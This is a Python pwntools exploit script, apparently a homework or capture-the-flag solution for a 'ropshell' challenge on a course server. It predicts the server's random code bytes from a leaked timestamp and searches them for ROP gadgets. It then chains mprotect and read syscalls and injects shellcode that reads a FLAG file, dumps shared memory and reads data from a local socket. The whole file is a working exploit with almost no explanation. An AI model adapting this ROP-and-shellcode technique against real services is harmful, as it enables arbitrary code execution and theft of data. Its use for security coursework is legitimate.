#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import numpy as np
import struct
import ctypes
libc = ctypes.CDLL('libc.so.6')

LEN_CODE = int('0x10000', 16)*10

context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
    # pw.pause()
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)


if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

r.recvuntil(b'Timestamp is ')
t = r.recvline().strip()
print("Timestamp is :",t)



libc.srand(int(t))#1683735121

codeint = []
mask = 2 ** 32 - 1
for i in range(LEN_CODE//4) :
    codeint.append(((libc.rand() << 16  & mask) | (libc.rand() & 0xffff)))
syscall_ret = libc.rand() % (LEN_CODE//4 - 1)
codeint[syscall_ret] = 0xc3050f

byte_array = bytearray()
for interger in codeint:
    byte_array.extend(struct.pack("I", interger))  #I: unsigned int, integer, 4 bytes
# byte =bytes(byte_array)

r.recvuntil(b'Random bytes generated at ')
code_start_address = r.recvline().strip()
print("code atart at : ", code_start_address)
print("=========================")

def find_instruction_addr(byte_array, instr_machine_code):
    index = byte_array.find(instr_machine_code)
    addr = int(code_start_address, 16)+index
    return addr


addrrax = find_instruction_addr(byte_array, asm("pop rax;ret"))  #b'X\xc3'
addrrdi = find_instruction_addr(byte_array, asm("pop rdi;ret"))  #b'_\xc3'
addrrsi = find_instruction_addr(byte_array, asm("pop rsi;ret"))
addrrdx = find_instruction_addr(byte_array, asm("pop rdx;ret"))
addr_syscall_ret = find_instruction_addr(byte_array, asm("syscall;ret"))
addr_syscall = find_instruction_addr(byte_array, asm("syscall"))
ret = find_instruction_addr(byte_array, asm("ret"))

exit_list = [p64(addrrax), p64(60), p64(addrrdi), p64(0), p64(addr_syscall_ret)]
# PROT_READ|PROT_WRITE|PROT_EXEC  = 7  用c印出來的
sys_mprotect = [p64(addrrax), p64(10), p64(addrrdi), p64(int(code_start_address, 16)), p64(addrrsi), p64(LEN_CODE), p64(addrrdx), p64(7), p64(addr_syscall_ret)]
# same as read
# execute asm code store at code_start_address
read_asm = [p64(addrrax), p64(0), p64(addrrdi), p64(0), p64(addrrsi), p64(int(code_start_address, 16)), p64(addrrdx), p64(1000), p64(addr_syscall_ret)]
write = [p64(addrrax), p64(1), p64(addrrdi), p64(1), p64(addrrsi), p64(int(code_start_address, 16)), p64(addrrdx), p64(16), p64(addr_syscall_ret)]

#     section .data
# hello: db "hello, world!", 0x0a
# mlen: equ $-hello
#     section .text
# mov rax, 1
# mov rdi, 1
# mov rsi, hello
# mov rdx, mlen
# syscall

# same as read
# sockaddr store at code_start_address+LEN_CODE-16
# read_sockaddr = [p64(addrrax), p64(0), p64(addrrdi), p64(0), p64(addrrsi), p64(int(code_start_address, 16)+LEN_CODE-16), p64(addrrdx), p64(16), p64(addr_syscall_ret)]
r.recvuntil(b'shell> ')
buf = b''.join(sys_mprotect+ read_asm + [p64(int(code_start_address, 16)+16)])  # jump to code_start_address when "ret"
# print("send to server = ", buf)
r.send(buf)

# Task 2: show the FLAG read from the /FLAG file.
# syscall open ./FLAG file => read the file => write to terminal
shellcode_readFLAG = ''
shellcode_readFLAG += shellcraft.pushstr('./FLAG').rstrip()
shellcode_readFLAG += shellcraft.open('rsp', 0, 0)
shellcode_readFLAG += shellcraft.read('rax', 'rsp', 100)  
shellcode_readFLAG += shellcraft.amd64.strlen('rsp', 'r12')
shellcode_readFLAG += shellcraft.write(1, 'rsp', 'r12')  #0x45 會多 2 bytes \x00
# Task 3:  show the FLAG stored in the shared memory (of key 0x1337). 
# syscall sys_shmget => sys_shmmat => write to terminal
# =====================================================================
# sys_shmget
# key : 0x1337 (spec講的)
# size : 0
# shmflg : 0

# sys_shmat
# shmid : sys_shmget 回傳的
# shmaddr : NULL  = 0
# shmflg  : SHM_RDONLY  = 4096
shmget_shmat = asm("""
mov rax, 29
mov rdi, 0x1337
mov rsi, 0
mov rdx, 0
syscall

mov rdi, rax
mov rax, 30
mov rsi, 0
mov rdx, 4096
syscall  
""")
# ret at the end cause we want to jump to next address when socket connect

shellcode_writeShm = ''             
shellcode_writeShm += shellcraft.amd64.mov('r13', 'rax', stack_allowed=False)
shellcode_writeShm += shellcraft.amd64.strlen('rax', 'rcx')
shellcode_writeShm += shellcraft.write(1, 'r13', 'rcx')
#=============================================================
# 以下原先的寫法不行
# shellcode_writeShm += shellcraft.amd64.strlen('rax', 'r10')
# shellcode_writeShm += shellcraft.write(1, 'rax', 'r10')  #不行直接從 return的 rax印，因執行syscall時，rax會被改成syscall的number


# Task 4:  Connecting to a server running at localhost:0x1337, and receiving the data from the server.
# (ip address: localhost 如同 127.0.0.1, port number: 0x1337) 
# syscall sys_shmget => sys_shmmat => write to terminal
# =====================================================================
# sys_socket
# family : AF_INET = 2 (AF_INET使用IPv4協定)
# type : SOCK_STREAM = 1 (對應的protocol為TCP)
# protocol : 0

# sys_connect
# fd : sys_socket 回傳的
# struct sockaddr *uservaddr : 
#     1.sin_family: AF_INET = 0x0002 PF_INET ? (2 BYTES)
#     2.sin_port: htons(0x1337) => 0x3713      (2 BYTES)
#     3.sin addr: 127.0.0.1 (要再轉換type), s_addr : 0x1   (4 BYTES)
#     4.sin_zero: 0                            (8 BYTES)
#     (不足 16 bytes 後面 8 bytes 補 0)
# addrlen  : sizeof(struct sockaddr_in)  = 16

#return 4
socket = asm("""
mov rax, 41
mov rdi, 2
mov rsi, 1
mov rdx, 0
syscall
""")


shellcode_connect = ''
shellcode_connect += "mov rdi, rax\n"
shellcode_connect += "mov rbx, rax\n"
shellcode_connect += "mov rdx, 16\n"
shellcode_connect += "mov rsi, "+str(hex((int(code_start_address, 16))))+"\n"
shellcode_connect += "mov rax, 42\n"
shellcode_connect += "syscall"

test = asm("""
add rbx, 0x30
""")

# print("dissam(shellcraft.amd64.linux.connect('localhost', 0x1337) = ", shellcraft.amd64.linux.connect('localhost', 0x1337))
shellcode_socket = ''
# shellcode_socket += shellcraft.amd64.linux.socket()
# shellcode_socket += shellcraft.amd64.linux.connect('localhost', 0x1337) 
shellcode_socket += shellcraft.amd64.linux.read('rbx', int(code_start_address, 16)+LEN_CODE-1000, 100)
# shellcode_socket += shellcraft.amd64.push(int(code_start_address, 16)+LEN_CODE-1000)
# shellcode_socket += shellcraft.amd64.strlen('rsp', 'rbx')
shellcode_socket += shellcraft.write(1, int(code_start_address, 16)+LEN_CODE-1000, 0x43)

shellcode_SocketRead = "mov rdi, rbx\n"
shellcode_SocketRead += "mov rsi, "+str(hex((int(code_start_address, 16)+LEN_CODE-1000)))+"\n"
shellcode_SocketRead += "mov rdx, 10\n"  #read 10 byte , flag 長度是0x43 (是67byte), 所以之前把 read retrun 值當exit number 印出來裁示67
shellcode_SocketRead += "mov rax, 0\n"
shellcode_SocketRead += "syscall\n"
# shellcode_SocketRead += "mov rdi, 1\n"
# shellcode_SocketRead += "mov rsi, "+str(hex((int(code_start_address, 16)+LEN_CODE-1000)))+"\n"
# shellcode_SocketRead += "mov rdx, 0x43\n"
# shellcode_SocketRead += "mov rax, 1\n"
# shellcode_SocketRead += "syscall"

# shellcode_writeSocket = ''    
# shellcode_writeSocket += shellcraft.amd64.read('rbx', 'r14', 100)
# shellcode_writeSocket += shellcraft.amd64.strlen('rbx', 'r12')
# shellcode_writeSocket += shellcraft.write(1, 'rbx', 'r12')  



exit = asm("""
mov r15, rax
mov rax, 60
mov rdi, r15
syscall
""")

shellcode_exit = shellcraft.amd64.linux.exit(0)

def hex_to_bytes(hex_string):  # ex: "0x3713"
    byte_array = bytearray()
    hex = hex_string[2:]
    for i in range(len(hex)//2):
        byte_array.extend(bytes.fromhex(hex[i*2:i*2+2]))
    byte = bytes(byte_array)
    # print("byte = ", byte)
    return byte

r.recvuntil(b'bytes command received.\n')
uservaddr = b''.join([hex_to_bytes("0x0200"),hex_to_bytes("0x1337"), hex_to_bytes("0x7f000001"), hex_to_bytes("0x0000000000000000")])
print( "uservaddr = ", uservaddr)
# address low(code_start_address)->high
# r.send(uservaddr+b''.join([asm(shellcode_readFLAG), shmget_shmat, asm(shellcode_writeShm), socket, asm(shellcode_connect), asm(shellcode_socket ), asm(shellcode_exit) ]))#, asm(shellcode_test),asm(shellcode_exit)]))

r.send(uservaddr+b''.join([asm(shellcode_readFLAG), shmget_shmat, asm(shellcode_writeShm), socket, asm(shellcode_connect), asm(shellcode_SocketRead),exit]))  #asm(shellcode_exit)]))

r.interactive()
# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :

# test = asm("""
# mov r14, rax
# mov rax, 60
# mov rdi, r14
# syscall
# """)

# test = asm("""
# add rax, 0x30
# mov r10, rax 
# """)

# shellcode_test = shellcraft.write(1, 'r10', 100)  

# shellcode_connect = ''
# shellcode_connect += "add rax, 0x30\n"
# shellcode_connect += "push rax"

# 用 shellcraft寫不行
# shellcode_socket = ''
# shellcode_socket += shellcraft.amd64.linux.socket()
# shellcode_socket += shellcraft.amd64.linux.connect('127.0.0.1', 0x1337) 
# shellcode_socket += shellcraft.amd64.mov('r14', 'rbp', stack_allowed=False)
# shellcode_socket += shellcraft.amd64.linux.read('r15', str(hex((int(code_start_address, 16)))), 16)
# shellcode_socket += shellcraft.amd64.strlen('r15', 'rbx')
# shellcode_socket += shellcraft.write(1, 'r15', 'rbx')